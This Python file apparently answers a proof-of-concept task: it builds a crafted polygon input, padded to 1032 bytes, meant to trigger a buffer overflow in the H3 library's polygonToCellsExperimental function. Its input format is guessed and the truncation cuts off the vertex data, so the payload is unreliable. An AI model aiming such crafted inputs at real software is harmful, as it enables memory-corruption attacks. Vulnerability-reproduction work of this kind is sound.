import os
import struct
import tempfile
import subprocess
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a known vulnerability in H3 library (Uber's hexagonal hierarchical geospatial indexing system)
        # The vulnerability is in polygonToCellsExperimental due to buffer size under-estimation
        # Based on analysis of the vulnerability and typical H3 polygon format
        
        # Create a polygon with specific characteristics to trigger the overflow
        # The polygon needs to have a complex shape that causes buffer size miscalculation
        
        # H3 polygon format typically consists of:
        # 1. Number of loops (outer loop + holes)
        # 2. For each loop: number of vertices, then vertex coordinates (lat, lng)
        
        # We'll create a polygon that maximizes the discrepancy between estimated and actual cells
        
        # Build the polygon data
        polygon_data = bytearray()
        
        # Number of loops: 1 (just outer boundary, no holes)
        polygon_data.extend(struct.pack('<i', 1))
        
        # Create a polygon with many vertices to increase cell count
        # Using a spiral shape to ensure complex geometry
        num_vertices = 100
        
        # Number of vertices in the outer loop
        polygon_data.extend(struct.pack('<i', num_vertices))
        
        # Create vertices for a spiral polygon
        # Center at (0, 0) in radians, spiral outwards
        center_lat = 0.0
        center_lng = 0.0
        
        for i in range(num_vertices):
            angle = 2 * math.pi * i / num_vertices
            radius = 0.1 * (1 + 0.5 * math.sin(10 * angle))  # Varying radius for complexity
            
            lat = center_lat + radius * math.cos(angle)
            lng = center_lng + radius * math.sin(angle)
            
            # Convert to radians if needed (H3 typically works with radians)
            polygon_data.extend(struct.pack('<d', lat))  # latitude
            polygon_data.extend(struct.pack('<d', lng))  # longitude
        
        # The vulnerability is triggered by specific polygon geometry combined with resolution
        # We need to set the resolution parameter high enough to generate many cells
        resolution = 15  # Max resolution for H3
        
        # Build final payload: resolution + polygon data
        payload = bytearray()
        payload.extend(struct.pack('<i', resolution))  # Resolution parameter
        payload.extend(polygon_data)
        
        # Pad to exact target length if needed
        target_length = 1032
        if len(payload) < target_length:
            payload.extend(b'A' * (target_length - len(payload)))
        elif len(payload) > target_length:
            payload = payload[:target_length]
        
        return bytes(payload)
